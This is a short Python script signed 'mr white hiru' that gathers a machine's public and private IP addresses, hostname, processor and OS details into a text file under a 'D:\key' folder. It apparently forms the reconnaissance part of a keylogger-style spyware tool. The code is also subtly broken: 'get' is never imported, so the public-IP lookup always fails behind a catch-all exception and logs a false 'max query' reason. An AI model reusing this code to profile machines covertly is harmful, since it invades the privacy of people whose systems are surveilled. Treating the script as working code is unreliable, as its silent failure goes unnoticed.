#code by mr white hiru
import os
import time
import socket
import platform
system_info = "syseminfo.txt"
extend = "\\"
file_path = "D:\key" # Enter the file path you want your files to be saved to
file_merge = file_path + extend

def system_information():
    with open(file_merge + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (May be due to max query) \n")

        f.write("Processor Info: " + (platform.processor()) + '\n')
        f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

system_information()
